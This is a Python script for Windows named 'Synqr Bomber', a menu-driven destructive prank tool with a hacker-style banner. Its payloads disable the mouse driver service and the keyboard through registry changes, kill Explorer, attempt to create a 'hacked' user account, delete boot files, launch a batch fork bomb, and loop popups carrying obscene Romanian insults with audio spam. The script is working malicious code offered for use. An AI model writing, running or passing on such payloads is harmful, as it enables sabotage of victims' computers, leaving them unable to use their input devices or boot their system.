import os
import sys
import time
import subprocess
import random

if os.name != 'nt':
    print("This script is designed for Windows.")
    sys.exit(1)

import msvcrt

SOUND_PATH = os.path.expanduser(r"~\Music\Sound.mp3")

RED = "\033[91m"
BRIGHT_RED = "\033[1;91m"
DARK_RED = "\033[31m"
GRAY = "\033[90m"
WHITE = "\033[97m"
BLACK = "\033[30m"
BG_RED = "\033[41m"
RESET = "\033[0m"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def type_print(text, delay=0.015, color=RED):
    for char in text:
        sys.stdout.write(f"{color}{char}{RESET}")
        sys.stdout.flush()
        time.sleep(delay)
    print()

def print_banner():
    print(f"{BRIGHT_RED}")
    print(r"""
 ███████╗██╗   ██╗███╗   ██╗ ██████╗ ██████╗     ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
 ██╔════╝╚██╗ ██╔╝████╗  ██║██╔═══██╗██╔══██╗    ██╔══██╗██╔══ ██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
 ███████╗ ╚████╔╝ ██╔██╗ ██║██║   ██║██████╔╝    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
 ╚════██║  ╚██╔╝  ██║╚██╗██║██║   ██║██╔══██╗    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
 ███████║   ██║   ██║ ╚████║╚██████╔╝██║  ██║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
 ╚══════╝   ╚═╝   ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
""")
    print(f"                     {WHITE}SYNQR BOMBER{RED} // {GRAY}ELITE KERNEL INTERFACE v5.0{RESET}\n")

def show_progress_bar(name, percent):
    total_width = 35
    filled_width = int(percent / 100 * total_width)
    empty_width = total_width - filled_width
    filled_bar = "█" * filled_width
    empty_bar = "-" * empty_width
    sys.stdout.write(f"{RED} ⚡ [{name.ljust(15)}] [{filled_bar}{GRAY}{empty_bar}{RED}] {str(percent).ljust(3)}%{RESET}\r")
    sys.stdout.flush()

def initialization_sequence():
    clear_screen()
    print_banner()
    print(f"{RED}╔══════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{RED}║{WHITE}               INITIALIZING SECURE KERNEL LAYERS                  {RED}║{RESET}")
    print(f"{RED}╚══════════════════════════════════════════════════════════════════╝{RESET}\n")
    
    components = ["KERNEL LOAD", "MEMORY ALLOC", "NET INTERFACE", "AUDIO ENGINE", "POPUP MODULE", "RENDER PIPELINE", "DARK WEB LAYER"]
    for comp in components:
        for i in range(0, 101, 25):
            show_progress_bar(comp, i)
            time.sleep(0.015)
        print()
        
    print(f"\n{RED}╔══════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{BRIGHT_RED}                  [ ✔ SYSTEM PROTOCOLS ENGAGED ]                  {RESET}")
    print(f"{RED}╚══════════════════════════════════════════════════════════════════╝{RESET}\n")
    time.sleep(0.6)

def start_audio_spam():
    clear_screen()
    print_banner()
    print(f"{RED}╔══════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{BRIGHT_RED} [STATUS]: AUDIO-SPAM ACTIVE... PRESS 'Q' IN TERMINAL TO ABORT    {RESET}")
    print(f"{RED}╚══════════════════════════════════════════════════════════════════╝{RESET}\n")
    
    popup_cmd = "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('AI FOST HACKUIT SCLAVULE BAG PULA IN MATA', 'Warning', 'OK', 'Warning')"
    audio_cmd = f"Add-Type -AssemblyName PresentationCore; $mp = New-Object System.Windows.Media.MediaPlayer; $mp.Open([Uri]'{SOUND_PATH}'); $mp.Play(); Start-Sleep -Seconds 3; $mp.Close()"

    while True:
        subprocess.Popen(["powershell", "-c", popup_cmd], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.Popen(["powershell", "-c", audio_cmd], creationflags=subprocess.CREATE_NO_WINDOW)
        
        start_time = time.time()
        while time.time() - start_time < 1.0:
            if msvcrt.kbhit():
                key = msvcrt.getch().decode('utf-8', errors='ignore').lower()
                if key == 'q':
                    type_print("\n[!] Aborting loop sequence... Returning to console.", color=BRIGHT_RED)
                    time.sleep(0.8)
                    return

def hide_documents():
    clear_screen()
    print_banner()
    type_print("[*] Executing payload: Hide My Documents Folder...", color=WHITE)
    os.system('attrib +h "%userprofile%\my documents"')
    type_print("[+] Target folder attribute modified successfully.", color=RED)
    input(f"\n{GRAY}Press Enter to return...{RESET}")

def disable_mouse():
    clear_screen()
    print_banner()
    type_print("[*] Executing payload: Disable Mouse Service...", color=WHITE)
    key = r"HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
    os.system(f'reg delete "{key}" /f >nul 2>&1')
    os.system(f'reg add "{key}" /v Start /t REG_DWORD /d 4 /f >nul 2>&1')
    type_print("[+] Mouse driver service disabled via registry override.", color=RED)
    input(f"\n{GRAY}Press Enter to return...{RESET}")

def disable_keyboard():
    clear_screen()
    print_banner()
    type_print("[*] Executing payload: Keyboard Scancode Map Injection...", color=WHITE)
    reg_content = """Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout]
"Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\
00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\
41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\
e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\
00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\
00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\
4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\
e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\
00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\
00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\
10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\
00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\
00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\
00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\
1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\
00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\
00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\
00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\
10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\
e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\
00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00
"""
    with open("nokeyboard.reg", "w") as f:
        f.write(reg_content)
    os.system('start "" "nokeyboard.reg"')
    type_print("[+] Keyboard registry patch generated and executed.", color=RED)
    input(f"\n{GRAY}Press Enter to return...{RESET}")

def fake_malware_prank():
    clear_screen()
    os.system('taskkill /f /im explorer.exe >nul 2>&1')
    type_print("malicious malware has been detected on your computer...", delay=0.03, color=BRIGHT_RED)
    time.sleep(0.8)
    type_print("attempting to contact your local windows firewall...", delay=0.03, color=RED)
    time.sleep(0.8)
    type_print("access was denied...try again", delay=0.03, color=RED)
    time.sleep(0.8)
    type_print("TROJAN INSTALLED", delay=0.04, color=BRIGHT_RED)
    os.system('net user hacked add >nul 2>&1')
    os.system('net user hacked hacker >nul 2>&1')
    time.sleep(0.5)
    for _ in range(3):
        os.system('dir /s')
    time.sleep(0.5)
    print(f"\n{BRIGHT_RED}Ai fost Hackuit sclavule bag pula in mata{RESET}")
    time.sleep(1)
    print(f"{BRIGHT_RED}Sugi pula{RESET}")
    input(f"\n{GRAY}Press Enter to restore explorer...{RESET}")
    os.system('explorer.exe')

def purge_system_files():
    clear_screen()
    print_banner()
    type_print("[*] Executing payload: System File Purge...", color=WHITE)
    os.system('attrib -r -s -h c:\\autoexec.bat >nul 2>&1')
    os.system('del c:\\autoexec.bat >nul 2>&1')
    os.system('attrib -r -s -h c:\\boot.ini >nul 2>&1')
    os.system('del c:\\boot.ini >nul 2>&1')
    os.system('attrib -r -s -h c:\\ntldr >nul 2>&1')
    os.system('del c:\\ntldr >nul 2>&1')
    os.system('attrib -r -s -h c:\\windowswin.ini >nul 2>&1')
    os.system('del c:\\windowswin.ini >nul 2>&1')
    type_print("[+] Purge sequence executed successfully.", color=RED)
    input(f"\n{GRAY}Press Enter to return...{RESET}")

def crash_computer_loop():
    clear_screen()
    print_banner()
    type_print("[*] Generating Fork Bomb payload...", color=WHITE)
    with open("crash.bat", "w") as f:
        for _ in range(12):
            f.write('start "" %0\n')
    os.system('start "" crash.bat')
    type_print("[+] Crash sequence initiated.", color=BRIGHT_RED)
    input(f"\n{GRAY}Press Enter to return...{RESET}")

def matrix_stream():
    clear_screen()
    print(f"{RED}")
    for _ in range(50):
        line = "".join([str(random.randint(0, 1)) for _ in range(65)])
        print(line)
        time.sleep(0.02)
    print(f"{RESET}")
    input(f"\n{GRAY}Press Enter to return...{RESET}")

def net_diagnostic():
    clear_screen()
    print_banner()
    type_print("[*] Running Network Socket Diagnostics...", color=WHITE)
    os.system('ping 127.0.0.1 -n 3')
    input(f"\n{GRAY}Press Enter to return...{RESET}")

def interactive_menu():
    options = [
        "Audio-Spam & Popup Loop",
        "Hide My Documents Folder",
        "Disable Mouse Service",
        "Disable Keyboard Registry",
        "Fake Malware Screen Prank",
        "System File Purge Payload",
        "Crash Computer Loop (Bomb)",
        "Matrix Stream Display",
        "Network Socket Diagnostic",
        "Exit Synqr Bomber"
    ]
    
    current_index = 0
    
    while True:
        clear_screen()
        print_banner()
        print(f"{RED}╔══════════════════════════════════════════════════════════════════╗{RESET}")
        print(f"{RED}║{WHITE}        USE [↑ / ↓] ARROWS TO NAVIGATE │ [ENTER] TO EXECUTE       {RED}║{RESET}")
        print(f"{RED}╠══════════════════════════════════════════════════════════════════╣{RESET}")
        
        for idx, option in enumerate(options):
            number_tag = f"[{idx + 1}]".ljust(4)
            if idx == current_index:
                print(f"{RED}║{BG_RED}{BLACK} > {number_tag} {option.ljust(53)} {RESET}{RED}║{RESET}")
            else:
                print(f"{RED}║{WHITE}   {number_tag} {option.ljust(53)} {RED}║{RESET}")
                
        print(f"{RED}╚══════════════════════════════════════════════════════════════════╝{RESET}")
        
        key = msvcrt.getch()
        if key == b'\xe0':  # Arrow key prefix
            arrow = msvcrt.getch()
            if arrow == b'H':  # Up arrow
                current_index = (current_index - 1) % len(options)
            elif arrow == b'P':  # Down arrow
                current_index = (current_index + 1) % len(options)
        elif key == b'\r':  # Enter key
            choice = current_index + 1
            if choice == 1: start_audio_spam()
            elif choice == 2: hide_documents()
            elif choice == 3: disable_mouse()
            elif choice == 4: disable_keyboard()
            elif choice == 5: fake_malware_prank()
            elif choice == 6: purge_system_files()
            elif choice == 7: crash_computer_loop()
            elif choice == 8: matrix_stream()
            elif choice == 9: net_diagnostic()
            elif choice == 10:
                type_print("[*] Terminating Synqr Bomber securely. Goodbye.", color=BRIGHT_RED)
                sys.exit(0)

def main():
    os.system('')
    initialization_sequence()
    interactive_menu()

if __name__ == "__main__":
    main()
